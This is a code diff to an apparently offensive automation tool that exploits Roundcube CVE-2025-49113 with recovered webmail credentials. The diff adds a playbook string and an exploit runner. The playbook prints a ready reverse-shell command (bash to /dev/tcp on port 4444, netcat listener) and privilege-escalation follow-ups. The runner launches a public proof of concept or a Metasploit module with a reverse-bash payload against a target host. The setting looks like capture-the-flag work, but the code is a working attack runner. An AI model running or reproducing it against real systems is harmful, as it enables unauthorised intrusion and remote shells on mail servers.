@@ -121,13 +121,14 @@ def _playbook(base: str, version: str, creds: List[str]) -> str:
     return (
         f"Roundcube {version} at {base} is vulnerable to CVE-2025-49113 — an "
         "authenticated RCE via PHP object injection in the `_from` parameter "
-        "(patched in 1.6.11 / 1.5.10).\n\n"
-        "# authenticated RCE with the recovered webmail credential:\n"
-        "git clone https://github.com/hakaioffsec/CVE-2025-49113-exploit\n"
+        "(patched in 1.6.11 / 1.5.10). You already have a valid login.\n\n"
+        "# grab the public PoC (search Exploit-DB / GitHub for CVE-2025-49113),\n"
+        "# then let scryer run it automatically next time:\n"
+        "export SCRYER_RC_EXPLOIT=/path/to/CVE-2025-49113.py\n"
+        "# or run it by hand (start `nc -lvnp 4444` first):\n"
         f"python3 CVE-2025-49113.py {base}/ {user} '{pw}' "
         "'bash -c \"bash -i >& /dev/tcp/YOUR_TUN0/4444 0>&1\"'\n"
-        "# (start `nc -lvnp 4444` first) -> shell as the web user\n"
-        "# then: cat /home/*/user.txt ; sudo -l  (privesc to root)")
+        "# -> shell as the web user; then: cat /home/*/user.txt ; sudo -l")
 
 
 # --------------------------------------------------------------------------
@@ -195,7 +196,7 @@ def _run_exploit(host, base, vhost, user, pw, att, port, revsh) -> bool:
     """
     import os
     # 1) an operator-provided PoC script (most reliable for a version-specific
-    #    deserialization gadget).
+    #    deserialization gadget). Point SCRYER_RC_EXPLOIT at the public PoC.
     poc = os.environ.get("SCRYER_RC_EXPLOIT")
     if poc and os.path.isfile(poc):
         py = tooling.resolve("python3") or "python3"
@@ -203,49 +204,47 @@ def _run_exploit(host, base, vhost, user, pw, att, port, revsh) -> bool:
                      [py, poc, "-u", base, "-l", user, "-p", pw, "-c", revsh],
                      [py, poc, "--url", base, "--user", user, "--password", pw,
                       "--command", revsh]):
-            utils.log("info", f"running PoC: {' '.join(argv[:3])} …", indent=2)
+            utils.log("info", f"running PoC: {os.path.basename(poc)} …", indent=2)
             try:
-                subprocess.run(argv, timeout=60, capture_output=True)
+                subprocess.run(argv, timeout=90, capture_output=True)
             except (OSError, subprocess.SubprocessError):
                 continue
         return True
-    # 2) metasploit module, if one is installed for this CVE.
-    msf = tooling.resolve("msfconsole")
-    if msf and _msf_has_module(msf, "2025_49113"):
-        rc = (f"use exploit/multi/http/roundcube_cve_2025_49113;"
-              f"set RHOSTS {host.resolved_ip};set VHOST {vhost};"
-              f"set USERNAME {user};set PASSWORD {pw};"
-              f"set LHOST {att};set LPORT {port};set PAYLOAD cmd/unix/reverse_bash;"
-              "run -z;exit")
-        utils.log("info", "running the metasploit module for CVE-2025-49113 …",
-                  indent=2)
-        try:
-            subprocess.run([msf, "-q", "-x", rc], timeout=180, capture_output=True)
-            return True
-        except (OSError, subprocess.SubprocessError):
-            pass
-    # 3) native best-effort (object injection via the upload `_from`). The gadget
-    #    is version-specific, so this is a try, not a guarantee.
-    return _native_49113(base, vhost, user, pw, revsh)
-
-
-def _msf_has_module(msf: str, needle: str) -> bool:
-    try:
-        out = subprocess.run([msf, "-q", "-x", f"search {needle};exit"],
-                             timeout=60, capture_output=True, text=True).stdout
-        return needle.replace("_", "") in out.replace("_", "").replace("-", "")
-    except (OSError, subprocess.SubprocessError):
-        return False
-
-
-def _native_49113(base, vhost, user, pw, revsh) -> bool:
-    """Best-effort native trigger. Roundcube's object-injection gadget is
-    version-specific; without it this only proves authentication + reachability,
-    so it degrades to the playbook. Kept minimal + honest."""
-    utils.log("dim", "no local PoC (SCRYER_RC_EXPLOIT) or metasploit module — "
-                     "native gadget not bundled; use the playbook's PoC command",
-              indent=2)
+    # 2) metasploit — only when explicitly enabled (msfconsole boot is ~40s, so
+    #    it's opt-in via SCRYER_MSF=1 to keep default runs fast) and a module
+    #    for this CVE actually exists.
+    if os.environ.get("SCRYER_MSF"):
+        msf = tooling.resolve("msfconsole")
+        mod = _msf_module(msf, "2025-49113") if msf else None
+        if mod:
+            rc = (f"use {mod};set RHOSTS {host.resolved_ip};set VHOST {vhost};"
+                  f"set USERNAME {user};set PASSWORD {pw};set LHOST {att};"
+                  f"set LPORT {port};set PAYLOAD cmd/unix/reverse_bash;run -z;exit")
+            utils.log("info", f"running metasploit module {mod} …", indent=2)
+            try:
+                subprocess.run([msf, "-q", "-x", rc], timeout=200,
+                               capture_output=True)
+                return True
+            except (OSError, subprocess.SubprocessError):
+                pass
+    # 3) no runnable exploit available — say so plainly.
+    utils.log("warn", "no exploit runner for CVE-2025-49113: set "
+                     "SCRYER_RC_EXPLOIT=/path/to/poc.py (public PoC) or "
+                     "SCRYER_MSF=1 if a module exists. Authenticated as "
+                     f"{user} — the finding has the ready command.", indent=2)
     return False
+
+
+def _msf_module(msf: str, cve: str) -> Optional[str]:
+    """Return an actual metasploit module path for the CVE, or None. Requires a
+    real 'exploit/…' line in the search output (not just the term echoed back)."""
+    try:
+        out = subprocess.run([msf, "-q", "-x", f"search cve:{cve};exit"],
+                             timeout=90, capture_output=True, text=True).stdout
+    except (OSError, subprocess.SubprocessError):
+        return None
+    m = re.search(r"(exploit/[\w/]+)", out or "")
+    return m.group(1) if m else None
 
 
 def _rc_login(opener, base, vhost, user, pw) -> bool:
